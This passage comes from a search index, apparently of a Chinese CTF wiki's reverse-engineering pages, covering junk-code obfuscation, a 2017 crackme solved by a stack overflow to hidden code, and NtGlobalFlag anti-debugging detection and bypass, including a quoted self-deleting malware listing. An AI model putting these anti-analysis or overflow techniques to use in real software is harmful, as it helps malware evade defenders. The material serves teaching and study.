\u70b9\u51fb\u83dc\u5355\u680f\u7684 \"\u67e5\u770b\" , \u9009\u62e9 \"RUN\u8ddf\u8e2a\" , \u7136\u540e\u518d\u70b9\u51fb \"\u8c03\u8bd5\" , \u9009\u62e9 \"\u8ddf\u8e2a\u6b65\u5165\" , \u7a0b\u5e8f\u4f1a\u8bb0\u5f55\u8fd9\u6bb5\u82b1\u6307\u4ee4\u6267\u884c\u7684\u8fc7\u7a0b, \u5982\u4e0b\u56fe\u6240\u793a: \u8fd9\u6bb5\u82b1\u6307\u4ee4\u672c\u6765\u5f88\u957f, \u4f46\u662f\u4f7f\u7528OD\u7684\u8ddf\u8e2a\u529f\u80fd\u540e, \u82b1\u6307\u4ee4\u7684\u6267\u884c\u6d41\u7a0b\u5c31\u975e\u5e38\u6e05\u695a. \u6574\u4e2a\u8fc7\u7a0b\u4e2d\u8fdb\u884c\u4e86\u5927\u91cf\u7684\u8df3\u8f6c, \u6211\u4eec\u53ea\u8981\u53d6\u5176\u4e2d\u7684\u6709\u6548\u6307\u4ee4\u62ff\u51fa\u6765\u5206\u6790\u5373\u53ef. \u9700\u8981\u6ce8\u610f\u7684\u662f, \u5728\u6709\u6548\u6307\u4ee4\u4e2d, \u6211\u4eec\u4f9d\u65e7\u8981\u6ee1\u8db3\u4e00\u4e9b\u6761\u4ef6\u8df3\u8f6c, \u8fd9\u6837\u7a0b\u5e8f\u624d\u80fd\u5728\u6b63\u786e\u7684\u903b\u8f91\u4e0a\u4e00\u76f4\u6267\u884c\u4e0b\u53bb. \u6bd4\u5982 0x413420 \u5904\u7684 jnz ctf2017_.00413B03 . \u6211\u4eec\u5c31\u8981\u91cd\u65b0\u6765\u8fc7, \u5e76\u5728 0x413420 \u8bbe\u4e0b\u65ad\u70b9 \u901a\u8fc7\u4fee\u6539\u6807\u5fd7\u5bc4\u5b58\u5668\u6765\u6ee1\u8db3\u8df3\u8f6c. \u7ee7\u7eed\u8ddf\u8e2a\u6b65\u5165(\u4e4b\u540e\u8fd8\u6709 0041362E jnz ctf2017_.00413B03 \u9700\u8981\u6ee1\u8db3). \u4fdd\u8bc1\u903b\u8f91\u6b63\u786e\u540e, \u5c06\u6709\u6548\u6307\u4ee4\u53d6\u51fa\u7ee7\u7eed\u5206\u6790\u5c31\u597d\u4e86","title":"\u82b1\u6307\u4ee4"},{"location":"reverse/anti-debug/junk-code/#_1","text":"\u82b1\u6307\u4ee4\u662f\u4f01\u56fe\u9690\u85cf\u6389\u4e0d\u60f3\u88ab\u9006\u5411\u5de5\u7a0b\u7684\u4ee3\u7801\u5757(\u6216\u5176\u5b83\u529f\u80fd)\u7684\u4e00\u79cd\u65b9\u6cd5, \u5728\u771f\u5b9e\u4ee3\u7801\u4e2d\u63d2\u5165\u4e00\u4e9b\u5783\u573e\u4ee3\u7801\u7684\u540c\u65f6\u8fd8\u4fdd\u8bc1\u539f\u6709\u7a0b\u5e8f\u7684\u6b63\u786e\u6267\u884c, \u800c\u7a0b\u5e8f\u65e0\u6cd5\u5f88\u597d\u5730\u53cd\u7f16\u8bd1, \u96be\u4ee5\u7406\u89e3\u7a0b\u5e8f\u5185\u5bb9, \u8fbe\u5230\u6df7\u6dc6\u89c6\u542c\u7684\u6548\u679c.","title":"\u539f\u7406"},{"location":"reverse/anti-debug/junk-code/#_2","text":"\u8fd9\u91cc\u4ee5 \u770b\u96ea.TSRC 2017CTF\u79cb\u5b63\u8d5b \u7b2c\u4e8c\u9898\u4f5c\u4e3a\u8bb2\u89e3. \u9898\u76ee\u4e0b\u8f7d\u94fe\u63a5: ctf2017_Fpc.exe \u7a0b\u5e8f\u5199\u4e86\u51e0\u4e2a\u51fd\u6570\u6df7\u6dc6\u89c6\u542c, \u5c06\u5173\u952e\u7684\u9a8c\u8bc1\u903b\u8f91\u52a0\u82b1\u6307\u4ee4\u9632\u6b62\u4e86IDA\u7684\u9759\u6001\u5206\u6790. \u6211\u4eec\u7528IDA\u6253\u5f00Fpc\u8fd9\u9053\u9898, \u7a0b\u5e8f\u4f1a\u5148\u6253\u5370\u4e00\u4e9b\u63d0\u793a\u4fe1\u606f, \u7136\u540e\u83b7\u53d6\u7528\u6237\u7684\u8f93\u5165. \u8fd9\u91cc\u4f7f\u7528\u4e86\u4e0d\u5b89\u5168\u7684 scanf \u51fd\u6570, \u7528\u6237\u8f93\u5165\u7684\u7f13\u51b2\u533a\u53ea\u6709 0xCh \u957f, \u6211\u4eec\u53cc\u51fb v1 \u8fdb\u5165\u6808\u5e27\u89c6\u56fe \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6ea2\u51fa\u6570\u636e, \u8986\u76d6\u6389\u8fd4\u56de\u5730\u5740, \u4ece\u800c\u8f6c\u79fb\u5230\u4efb\u610f\u5730\u5740\u7ee7\u7eed\u6267\u884c. \u8fd9\u91cc\u6211\u8fd8\u9700\u8981\u89e3\u91ca\u4e00\u4e0b, \u5c31\u662f scanf \u4e4b\u524d\u5199\u7684\u51e0\u4e2a\u6df7\u6dc6\u89c6\u542c\u7684\u51fd\u6570, \u662f\u4e00\u4e9b\u7b80\u5355\u7684\u65b9\u7a0b\u5f0f\u4f46\u5b9e\u9645\u4e0a\u662f\u65e0\u89e3\u7684. \u7a0b\u5e8f\u5c06\u771f\u6b63\u7684\u9a8c\u8bc1\u903b\u8f91\u52a0\u82b1\u6df7\u6dc6, \u5bfc\u81f4IDA\u65e0\u6cd5\u5f88\u597d\u7684\u8fdb\u884c\u53cd\u7f16\u8bd1. \u6240\u4ee5\u6211\u4eec\u8fd9\u9053\u9898\u7684\u601d\u8def\u5c31\u662f, \u901a\u8fc7\u6ea2\u51fa\u8f6c\u5230\u771f\u6b63\u7684\u9a8c\u8bc1\u4ee3\u7801\u5904\u7ee7\u7eed\u6267\u884c. \u6211\u4eec\u5728\u5206\u6790\u65f6\u53ef\u4ee5\u5728\u4ee3\u7801\u4e0d\u8fdc\u5904\u53d1\u73b0\u4ee5\u4e0b\u6570\u636e\u5757. \u56e0\u4e3aIDA\u6ca1\u80fd\u5f88\u597d\u7684\u8bc6\u522b\u6570\u636e, \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5c06\u5149\u6807\u79fb\u5230\u6570\u636e\u5757\u7684\u8d77\u59cb\u4f4d\u7f6e, \u7136\u540e\u6309\u4e0b C \u952e(code)\u5c06\u8fd9\u5757\u6570\u636e\u53cd\u6c47\u7f16\u6210\u4ee3\u7801 \u503c\u5f97\u6ce8\u610f\u7684\u662f, \u8fd9\u6bb5\u4ee3\u7801\u7684\u4f4d\u7f6e\u662f 0x00413131 , 0x41 \u662f 'A' \u7684ascii\u7801\uff0c\u800c 0x31 \u662f '1' \u7684ascii\u7801. \u7531\u4e8e\u770b\u96ea\u6bd4\u8d5b\u7684\u9650\u5236, \u7528\u6237\u8f93\u5165\u53ea\u80fd\u662f\u5b57\u6bcd\u548c\u6570\u5b57, \u6240\u4ee5\u6211\u4eec\u4e5f\u5b8c\u5168\u53ef\u4ee5\u5229\u7528\u6ea2\u51fa\u6f0f\u6d1e\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801 \u7528OD\u6253\u5f00, \u7136\u540e Ctrl+G \u5230\u8fbe 0x413131 \u5904\u8bbe\u4e0b\u65ad\u70b9, \u8fd0\u884c\u540e\u8f93\u5165 12345612345611A \u56de\u8f66, \u7a0b\u5e8f\u6210\u529f\u5730\u5230\u8fbe 0x00413131 \u5904. \u7136\u540e \u53f3\u952e\u5206\u6790->\u4ece\u6a21\u5757\u4e2d\u5220\u9664\u5206\u6790 \u8bc6\u522b\u51fa\u6b63\u786e\u4ee3\u7801 \u65ad\u5728 0x413131 \u5904\u540e, \u70b9\u51fb\u83dc\u5355\u680f\u7684 \"\u67e5\u770b\" , \u9009\u62e9 \"RUN\u8ddf\u8e2a\" , \u7136\u540e\u518d\u70b9\u51fb \"\u8c03\u8bd5\" , \u9009\u62e9 \"\u8ddf\u8e2a\u6b65\u5165\" , \u7a0b\u5e8f\u4f1a\u8bb0\u5f55\u8fd9\u6bb5\u82b1\u6307\u4ee4\u6267\u884c\u7684\u8fc7\u7a0b, \u5982\u4e0b\u56fe\u6240\u793a: \u8fd9\u6bb5\u82b1\u6307\u4ee4\u672c\u6765\u5f88\u957f, \u4f46\u662f\u4f7f\u7528OD\u7684\u8ddf\u8e2a\u529f\u80fd\u540e, \u82b1\u6307\u4ee4\u7684\u6267\u884c\u6d41\u7a0b\u5c31\u975e\u5e38\u6e05\u695a. \u6574\u4e2a\u8fc7\u7a0b\u4e2d\u8fdb\u884c\u4e86\u5927\u91cf\u7684\u8df3\u8f6c, \u6211\u4eec\u53ea\u8981\u53d6\u5176\u4e2d\u7684\u6709\u6548\u6307\u4ee4\u62ff\u51fa\u6765\u5206\u6790\u5373\u53ef. \u9700\u8981\u6ce8\u610f\u7684\u662f, \u5728\u6709\u6548\u6307\u4ee4\u4e2d, \u6211\u4eec\u4f9d\u65e7\u8981\u6ee1\u8db3\u4e00\u4e9b\u6761\u4ef6\u8df3\u8f6c, \u8fd9\u6837\u7a0b\u5e8f\u624d\u80fd\u5728\u6b63\u786e\u7684\u903b\u8f91\u4e0a\u4e00\u76f4\u6267\u884c\u4e0b\u53bb. \u6bd4\u5982 0x413420 \u5904\u7684 jnz ctf2017_.00413B03 . \u6211\u4eec\u5c31\u8981\u91cd\u65b0\u6765\u8fc7, \u5e76\u5728 0x413420 \u8bbe\u4e0b\u65ad\u70b9 \u901a\u8fc7\u4fee\u6539\u6807\u5fd7\u5bc4\u5b58\u5668\u6765\u6ee1\u8db3\u8df3\u8f6c. \u7ee7\u7eed\u8ddf\u8e2a\u6b65\u5165(\u4e4b\u540e\u8fd8\u6709 0041362E jnz ctf2017_.00413B03 \u9700\u8981\u6ee1\u8db3). \u4fdd\u8bc1\u903b\u8f91\u6b63\u786e\u540e, \u5c06\u6709\u6548\u6307\u4ee4\u53d6\u51fa\u7ee7\u7eed\u5206\u6790\u5c31\u597d\u4e86","title":"\u4f8b\u9898"},{"location":"reverse/anti-debug/ntglobalflag/","text":"\u5173\u4e8eNtGlobalFlag \u00b6 \u572832\u4f4d\u673a\u5668\u4e0a, NtGlobalFlag \u5b57\u6bb5\u4f4d\u4e8e PEB (\u8fdb\u7a0b\u73af\u5883\u5757) 0x68 \u7684\u504f\u79fb\u5904, 64\u4f4d\u673a\u5668\u5219\u662f\u5728\u504f\u79fb 0xBC \u4f4d\u7f6e. \u8be5\u5b57\u6bb5\u7684\u9ed8\u8ba4\u503c\u4e3a0. \u5f53\u8c03\u8bd5\u5668\u6b63\u5728\u8fd0\u884c\u65f6, \u8be5\u5b57\u6bb5\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u7279\u5b9a\u7684\u503c. \u5c3d\u7ba1\u8be5\u503c\u5e76\u4e0d\u80fd\u5341\u5206\u53ef\u4fe1\u5730\u8868\u660e\u67d0\u4e2a\u8c03\u8bd5\u5668\u771f\u7684\u6709\u5728\u8fd0\u884c, \u4f46\u8be5\u5b57\u6bb5\u5e38\u51fa\u4e8e\u8be5\u76ee\u7684\u800c\u88ab\u4f7f\u7528. \u8be5\u5b57\u6bb5\u5305\u542b\u6709\u4e00\u7cfb\u5217\u7684\u6807\u5fd7\u4f4d. \u7531\u8c03\u8bd5\u5668\u521b\u5efa\u7684\u8fdb\u7a0b\u4f1a\u8bbe\u7f6e\u4ee5\u4e0b\u6807\u5fd7\u4f4d: FLG_HEAP_ENABLE_TAIL_CHECK ( 0x10 ) FLG_HEAP_ENABLE_FREE_CHECK ( 0x20 ) FLG_HEAP_VALIDATE_PARAMETERS ( 0x40 ) \u68c0\u6d4b\u4ee3\u7801 \u00b6 \u56e0\u6b64, \u53ef\u4ee5\u68c0\u67e5\u8fd9\u51e0\u4e2a\u6807\u5fd7\u4f4d\u6765\u68c0\u6d4b\u8c03\u8bd5\u5668\u662f\u5426\u5b58\u5728. \u6bd4\u5982\u7528\u5f62\u5982\u4ee5\u4e0b\u768432\u4f4d\u7684\u4ee3\u7801\u572832\u4f4d\u673a\u5668\u4e0a\u8fdb\u884c\u68c0\u6d4b: mov eax , fs :[ 30 h ] ;Process Environment Block mov al , [ eax + 68 h ] ;NtGlobalFlag and al , 70 h cmp al , 70 h je being_debugged \u4ee5\u4e0b\u662f64\u4f4d\u7684\u4ee3\u7801\u572864\u4f4d\u673a\u5668\u4e0a\u7684\u68c0\u6d4b\u4ee3\u7801: push 60 h pop rsi gs: lodsq ;Process Environment Block mov al , [ rsi * 2 + rax-14h ] ;NtGlobalFlag and al , 70 h cmp al , 70 h je being_debugged \u8981\u6ce8\u610f\u7684\u662f, \u5982\u679c\u662f\u4e00\u4e2a32\u4f4d\u7a0b\u5e8f\u572864\u4f4d\u673a\u5668\u4e0a\u8fd0\u884c, \u90a3\u4e48\u5b9e\u9645\u4e0a\u4f1a\u5b58\u5728\u4e24\u4e2aPEB: \u4e00\u4e2a\u662f32\u4f4d\u90e8\u5206\u7684\u800c\u53e6\u4e00\u4e2a\u662f64\u4f4d. 64\u4f4d\u7684PEB\u7684\u5bf9\u5e94\u5b57\u6bb5\u4e5f\u4f1a\u50cf\u572832\u4f4d\u7684\u90a3\u6837\u800c\u6539\u53d8. \u4e8e\u662f\u6211\u4eec\u5c31\u8fd8\u6709\u4ee5\u4e0b\u7684, \u752832\u4f4d\u7684\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u673a\u5668\u73af\u5883: mov eax, fs:[30h] ; Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov al, [eax+10bch] ;NtGlobalFlag and al, 70h cmp al, 70h je being_debugged \u5207\u8bb0\u4e0d\u8981\u5728\u6ca1\u6709\u63a9\u76d6\u5176\u4ed6\u4f4d\u7684\u60c5\u51b5\u4e0b\u76f4\u63a5\u8fdb\u884c\u6bd4\u8f83, \u90a3\u6837\u4f1a\u65e0\u6cd5\u68c0\u6d4b\u5230\u8c03\u8bd5\u5668. \u5728 ExeCryptor \u5c31\u6709\u4f7f\u7528 NtGlobalFlag \u6765\u68c0\u6d4b\u8c03\u8bd5\u5668, \u4e0d\u8fc7 NtGlobalFlag \u7684\u90a33\u4e2a\u6807\u5fd7\u4f4d\u53ea\u6709\u5f53\u7a0b\u5e8f\u662f \u7531\u8c03\u8bd5\u5668\u521b\u5efa , \u800c\u975e \u7531\u8c03\u8bd5\u5668\u9644\u52a0 \u4e0a\u53bb\u7684\u8fdb\u7a0b\u65f6, \u624d\u4f1a\u88ab\u8bbe\u7f6e. \u6539\u53d8NtGlobalFlag\u521d\u503c \u00b6 \u5f53\u7136\u7ed5\u8fc7\u8fd9\u79cd\u68c0\u6d4b\u7684\u65b9\u6cd5\u4e5f\u5341\u5206\u7b80\u5355, \u90a3\u5c31\u662f\u8c03\u8bd5\u5668\u60f3\u529e\u6cd5\u5c06\u8be5\u5b57\u6bb5\u91cd\u65b0\u8bbe\u7f6e\u4e3a0. \u7136\u800c\u8fd9\u4e2a\u9ed8\u8ba4\u7684\u521d\u503c\u53ef\u4ee5\u7528\u4ee5\u4e0b\u56db\u79cd\u65b9\u6cd5\u4efb\u610f\u4e00\u79cd\u6539\u53d8: \u6ce8\u518c\u8868 HKLM\\System\\CurrentControlSet\\Control\\SessionManager \u7684 GlobalFlag \u7684\u503c\u4f1a\u66ff\u6362\u8fdb\u884c NtGlobalFlag \u5b57\u6bb5. \u5c3d\u7ba1\u5b83\u968f\u540e\u8fd8\u53ef\u80fd\u7531Windows\u6539\u53d8(\u4ee5\u4e0b\u4f1a\u4ecb\u7ecd), \u6ce8\u518c\u8868\u952e\u503c\u4f1a\u5bf9\u7cfb\u7edf\u4e2d\u6240\u6709\u8fdb\u7a0b\u4ea7\u751f\u5f71\u54cd\u5e76\u5728\u91cd\u542f\u540e\u751f\u6548. \u5f53\u7136\u8fd9\u4e5f\u4ea7\u751f\u4e86\u53e6\u4e00\u79cd\u68c0\u6d4b\u8c03\u8bd5\u5668\u7684\u65b9\u6cd5: \u5982\u679c\u4e00\u4e2a\u8c03\u8bd5\u5668\u4e3a\u4e86\u9690\u85cf\u81ea\u5df1, \u800c\u5c06\u6ce8\u518c\u8868\u4e2d\u7684\u952e\u503c\u590d\u5236\u5230 NtGlobalFlag \u5b57\u6bb5\u4e2d, \u7136\u800c\u6ce8\u518c\u8868\u4e2d\u7684\u952e\u503c\u4e8b\u5148\u5df2\u7ecf\u66ff\u6362\u5e76\u4e14\u5c1a\u672a\u91cd\u542f\u751f\u6548. \u90a3\u4e48\u8c03\u8bd5\u5668\u53ea\u662f\u590d\u5236\u4e86\u4e00\u4e2a\u5047\u7684\u503c, \u800c\u975e\u771f\u6b63\u9700\u8981\u7684\u90a3\u4e2a. \u5982\u679c\u7a0b\u5e8f\u77e5\u9053\u771f\u6b63\u7684\u503c\u800c\u975e\u6ce8\u518c\u8868\u4e2d\u7684\u90a3\u4e2a\u5047\u7684\u503c, \u90a3\u4e48\u5c31\u53ef\u4ee5\u5bdf\u89c9\u5230\u8c03\u8bd5\u5668\u7684\u5b58\u5728. \u5f53\u7136\u8c03\u8bd5\u5668\u4e5f\u53ef\u4ee5\u8fd0\u884c\u5176\u4ed6\u8fdb\u7a0b\u7136\u540e\u67e5\u8be2 NtGlobalFlag \u5b57\u6bb5\u6765\u83b7\u53d6\u771f\u6b63\u7684\u503c. \u4f9d\u65e7\u662f GlobalFlag , \u4e0d\u8fc7\u8fd9\u91cc\u7684\u662f HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<filename> . (\u6620\u50cf\u52ab\u6301), \u8fd9\u91cc\u9700\u8981\u5c06 <filename> \u66ff\u6362\u4e3a\u9700\u8981\u66f4\u6539\u7684\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6587\u4ef6\u540d(\u4e0d\u9700\u8981\u6307\u5b9a\u8def\u5f84). \u8bbe\u7f6e\u597d GlobalFlag \u540e, \u7cfb\u7edf\u4f1a\u5c06\u5176\u503c\u8986\u76d6\u5230 NtGlobalFlag \u5b57\u6bb5(\u53ea\u5355\u72ec\u4e3a\u6307\u5b9a\u7684\u8fdb\u7a0b\u8986\u76d6). \u4e0d\u8fc7\u4e5f\u8fd8\u662f\u53ef\u4ee5\u518d\u6b21\u7531Windows\u6539\u53d8(\u89c1\u4e0b). \u5728\u52a0\u8f7d\u914d\u7f6e\u8868( Load Configuration Table )\u7684\u4e24\u4e2a\u5b57\u6bb5: GlobalFlagsClear \u548c GlobalFlagsSet . GlobalFlagsClear \u5217\u51fa\u9700\u8981\u6e05\u7a7a\u7684\u6807\u5fd7\u4f4d, \u800c GlobalFlagsSet \u5219\u5217\u51fa\u9700\u8981\u8bbe\u7f6e\u7684\u6807\u5fd7\u4f4d, \u8fd9\u4e9b\u8bbe\u7f6e\u4f1a\u5728 GlobalFlag \u5e94\u7528\u4e4b\u540e\u518d\u751f\u6548, \u56e0\u6b64\u5b83\u53ef\u4ee5\u8986\u76d6\u6389 GlobalFlag \u6307\u5b9a\u7684\u503c. \u7136\u800c\u5b83\u65e0\u6cd5\u8986\u76d6\u6389Windows\u6307\u5b9a\u8bbe\u7f6e\u7684\u6807\u5fd7\u4f4d. \u6bd4\u5982\u8bbe\u7f6e FLG_USER_STACK_TRACE_DB (0x1000) \u53ef\u4ee5\u8ba9Windows\u8bbe\u7f6e FLG_HEAP_VALIDATE_PARAMETERS (0x40) \u6807\u5fd7\u4f4d, \u5c31\u7b97 FLG_HEAP_VALIDATE_PARAMETERS \u5728\u52a0\u8f7d\u914d\u7f6e\u8868( Load Configuration Table )\u4e2d\u88ab\u6e05\u7a7a\u4e86, Windows\u4e5f\u4f1a\u5728\u968f\u540e\u7684\u8fdb\u7a0b\u52a0\u8f7d\u8fc7\u7a0b\u4e2d\u91cd\u65b0\u8bbe\u7f6e. \u5f53\u8c03\u8bd5\u5668\u521b\u5efa\u8fdb\u7a0b\u65f6, Windows\u4f1a\u505a\u51fa\u4e00\u4e9b\u6539\u53d8. \u901a\u8fc7\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u4e2d\u7684 _NO_DEBUG_HEAP , NtGlobalFlag \u5c06\u4f1a\u56e0\u4e3a\u8c03\u8bd5\u5668\u800c\u4e0d\u4f1a\u8bbe\u7f6e\u5176\u4e2d\u76843\u4e2a\u5806\u7684\u6807\u5fd7\u4f4d. \u5f53\u7136\u5b83\u4eec\u4f9d\u65e7\u53ef\u4ee5\u901a\u8fc7 GlobalFlag \u6216\u52a0\u8f7d\u914d\u7f6e\u8868\u4e2d\u7684 GlobalFlagsSet \u7ee7\u7eed\u8bbe\u7f6e. \u5982\u4f55\u7ed5\u8fc7\u68c0\u6d4b? \u00b6 \u6709\u4ee5\u4e0b3\u79cd\u65b9\u6cd5\u6765\u7ed5\u8fc7 NtGlobalFlag \u7684\u68c0\u6d4b \u624b\u52a8\u4fee\u6539\u6807\u5fd7\u4f4d\u7684\u503c( FLG_HEAP_ENABLE_TAIL_CHECK , FLG_HEAP_ENABLE_FREE_CHECK , FLG_HEAP_VALIDATE_PARAMETERS ) \u5728Ollydbg\u4e2d\u4f7f\u7528 hide-debug \u63d2\u4ef6 \u5728Windbg\u7981\u7528\u8c03\u8bd5\u5806\u7684\u65b9\u5f0f\u542f\u52a8\u7a0b\u5e8f( windbg -hd program.exe ) \u624b\u52a8\u7ed5\u8fc7\u793a\u4f8b \u00b6 \u4ee5\u4e0b\u662f\u4e00\u4e2a\u6f14\u793a\u5982\u4f55\u624b\u52a8\u7ed5\u8fc7\u68c0\u6d4b\u7684\u793a\u4f8b .text: 00403594 64 A1 30 00 00 00 mov eax , large fs : 30 h ; PEB struct loaded into EAX .text : 0040359 A db 3 Eh ; IDA Pro display error (the byte is actually used in the next instruction) .text : 0040359 A 3 E 8 B 40 68 mov eax , [ eax + 68 h ] ; NtGlobalFlag (offset 0x68 relative to PEB) saved to EAX .text : 0040359 E 83 E8 70 sub eax , 70 h ; Value 0x70 corresponds to all flags on (FLG_HEAP_ENABLE_TAIL_CHECK, FLG_HEAP_ENABLE_FREE_CHECK, FLG_HEAP_VALIDATE_PARAMETERS) .text : 004035 A1 89 85 D8 E7 FF FF mov [ ebp + var_1828 ], eax .text: 004035 A7 83 BD D8 E7 FF FF 00 cmp [ ebp + var_1828 ], 0 ; Check whether 3 debug flags were on (result of substraction should be 0 if debugged) .text : 004035 AE 75 05 jnz short loc_4035B5 ; No debugger, program continues... .text : 004035 B0 E8 4 B DA FF FF call s_selfDelete ; ...else, malware deleted \u5728Ollydbg\u4e2d\u5728\u504f\u79fb 0x40359A \u8bbe\u7f6e\u65ad\u70b9, \u8fd0\u884c\u7a0b\u5e8f\u89e6\u53d1\u65ad\u70b9. \u7136\u540e\u6253\u5f00 CommandLine \u63d2\u4ef6\u7528 dump fs:[30]+0x68 dump\u51fa NtGlobalFlag \u7684\u5185\u5bb9 \u53f3\u952e\u9009\u62e9 Binary->Fill with 00's \u5c06\u503c 0x70 \u66ff\u6362\u4e3a 0x00 \u5373\u53ef. \u53c2\u8003\u94fe\u63a5 \u00b6 The \"Ultimate\" Anti-Debugging Reference PEB-Process-Environment-Block/NtGlobalFlag","title":"NtGlobalFlag"},{"location":"reverse/anti-debug/ntglobalflag/#ntglobalflag","text":"\u572832\u4f4d\u673a\u5668\u4e0a, NtGlobalFlag \u5b57\u6bb5\u4f4d\u4e8e PEB (\u8fdb\u7a0b\u73af\u5883\u5757) 0x68 \u7684\u504f\u79fb\u5904, 64\u4f4d\u673a\u5668\u5219\u662f\u5728\u504f\u79fb 0xBC \u4f4d\u7f6e. \u8be5\u5b57\u6bb5\u7684\u9ed8\u8ba4\u503c\u4e3a0. \u5f53\u8c03\u8bd5\u5668\u6b63\u5728\u8fd0\u884c\u65f6, \u8be5\u5b57\u6bb5\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u7279\u5b9a\u7684\u503c. \u5c3d\u7ba1\u8be5\u503c\u5e76\u4e0d\u80fd\u5341\u5206\u53ef\u4fe1\u5730\u8868\u660e\u67d0\u4e2a\u8c03\u8bd5\u5668\u771f\u7684\u6709\u5728\u8fd0\u884c, \u4f46\u8be5\u5b57\u6bb5\u5e38\u51fa\u4e8e\u8be5\u76ee\u7684\u800c\u88ab\u4f7f\u7528. \u8be5\u5b57\u6bb5\u5305\u542b\u6709\u4e00\u7cfb\u5217\u7684\u6807\u5fd7\u4f4d. \u7531\u8c03\u8bd5\u5668\u521b\u5efa\u7684\u8fdb\u7a0b\u4f1a\u8bbe\u7f6e\u4ee5\u4e0b\u6807\u5fd7\u4f4d: FLG_HEAP_ENABLE_TAIL_CHECK ( 0x10 ) FLG_HEAP_ENABLE_FREE_CHECK ( 0x20 ) FLG_HEAP_VALIDATE_PARAMETERS ( 0x40 )","title":"\u5173\u4e8eNtGlobalFlag"},{"location":"reverse/anti-debug/ntglobalflag/#_1","text":"\u56e0\u6b64, \u53ef\u4ee5\u68c0\u67e5\u8fd9\u51e0\u4e2a\u6807\u5fd7\u4f4d\u6765\u68c0\u6d4b\u8c03\u8bd5\u5668\u662f\u5426\u5b58\u5728. \u6bd4\u5982\u7528\u5f62\u5982\u4ee5\u4e0b\u768432\u4f4d\u7684\u4ee3\u7801\u572832\u4f4d\u673a\u5668\u4e0a\u8fdb\u884c\u68c0\u6d4b: mov eax , fs :[ 30 h ] ;Process Environment Block mov al , [ eax + 68 h ] ;NtGlobalFlag and al , 70 h cmp al , 70 h je being_debugged \u4ee5\u4e0b\u662f64\u4f4d\u7684\u4ee3\u7801\u572864\u4f4d\u673a\u5668\u4e0a\u7684\u68c0\u6d4b\u4ee3\u7801: push 60 h pop rsi gs: lodsq ;Process Environment Block mov al , [ rsi * 2 + rax-14h ] ;NtGlobalFlag and al , 70 h cmp al , 70 h je being_debugged \u8981\u6ce8\u610f\u7684\u662f, \u5982\u679c\u662f\u4e00\u4e2a32\u4f4d\u7a0b\u5e8f\u572864\u4f4d\u673a\u5668\u4e0a\u8fd0\u884c, \u90a3\u4e48\u5b9e\u9645\u4e0a\u4f1a\u5b58\u5728\u4e24\u4e2aPEB: \u4e00\u4e2a\u662f32\u4f4d\u90e8\u5206\u7684\u800c\u53e6\u4e00\u4e2a\u662f64\u4f4d. 64\u4f4d\u7684PEB\u7684\u5bf9\u5e94\u5b57\u6bb5\u4e5f\u4f1a\u50cf\u572832\u4f4d\u7684\u90a3\u6837\u800c\u6539\u53d8. \u4e8e\u662f\u6211\u4eec\u5c31\u8fd8\u6709\u4ee5\u4e0b\u7684, \u752832\u4f4d\u7684\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u673a\u5668\u73af\u5883: mov eax, fs:[30h] ; Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov al, [eax+10bch] ;NtGlobalFlag and al, 70h cmp al, 70h je being_debugged \u5207\u8bb0\u4e0d\u8981\u5728\u6ca1\u6709\u63a9\u76d6\u5176\u4ed6\u4f4d\u7684\u60c5\u51b5\u4e0b\u76f4\u63a5\u8fdb\u884c\u6bd4\u8f83, \u90a3\u6837\u4f1a\u65e0\u6cd5\u68c0\u6d4b\u5230\u8c03\u8bd5\u5668. \u5728 ExeCryptor \u5c31\u6709\u4f7f\u7528 NtGlobalFlag \u6765\u68c0\u6d4b\u8c03\u8bd5\u5668, \u4e0d\u8fc7 NtGlobalFlag \u7684\u90a33\u4e2a\u6807\u5fd7\u4f4d\u53ea\u6709\u5f53\u7a0b\u5e8f\u662f \u7531\u8c03\u8bd5\u5668\u521b\u5efa , \u800c\u975e \u7531\u8c03\u8bd5\u5668\u9644\u52a0 \u4e0a\u53bb\u7684\u8fdb\u7a0b\u65f6, \u624d\u4f1a\u88ab\u8bbe\u7f6e.","title":"\u68c0\u6d4b\u4ee3\u7801"},{"location":"reverse/anti-debug/ntglobalflag/#ntglobalflag_1","text":"\u5f53\u7136\u7ed5\u8fc7\u8fd9\u79cd\u68c0\u6d4b\u7684\u65b9\u6cd5\u4e5f\u5341\u5206\u7b80\u5355, \u90a3\u5c31\u662f\u8c03\u8bd5\u5668\u60f3\u529e\u6cd5\u5c06\u8be5\u5b57\u6bb5\u91cd\u65b0\u8bbe\u7f6e\u4e3a0. \u7136\u800c\u8fd9\u4e2a\u9ed8\u8ba4\u7684\u521d\u503c\u53ef\u4ee5\u7528\u4ee5\u4e0b\u56db\u79cd\u65b9\u6cd5\u4efb\u610f\u4e00\u79cd\u6539\u53d8: \u6ce8\u518c\u8868 HKLM\\System\\CurrentControlSet\\Control\\SessionManager \u7684 GlobalFlag \u7684\u503c\u4f1a\u66ff\u6362\u8fdb\u884c NtGlobalFlag \u5b57\u6bb5. \u5c3d\u7ba1\u5b83\u968f\u540e\u8fd8\u53ef\u80fd\u7531Windows\u6539\u53d8(\u4ee5\u4e0b\u4f1a\u4ecb\u7ecd), \u6ce8\u518c\u8868\u952e\u503c\u4f1a\u5bf9\u7cfb\u7edf\u4e2d\u6240\u6709\u8fdb\u7a0b\u4ea7\u751f\u5f71\u54cd\u5e76\u5728\u91cd\u542f\u540e\u751f\u6548. \u5f53\u7136\u8fd9\u4e5f\u4ea7\u751f\u4e86\u53e6\u4e00\u79cd\u68c0\u6d4b\u8c03\u8bd5\u5668\u7684\u65b9\u6cd5: \u5982\u679c\u4e00\u4e2a\u8c03\u8bd5\u5668\u4e3a\u4e86\u9690\u85cf\u81ea\u5df1, \u800c\u5c06\u6ce8\u518c\u8868\u4e2d\u7684\u952e\u503c\u590d\u5236\u5230 NtGlobalFlag \u5b57\u6bb5\u4e2d, 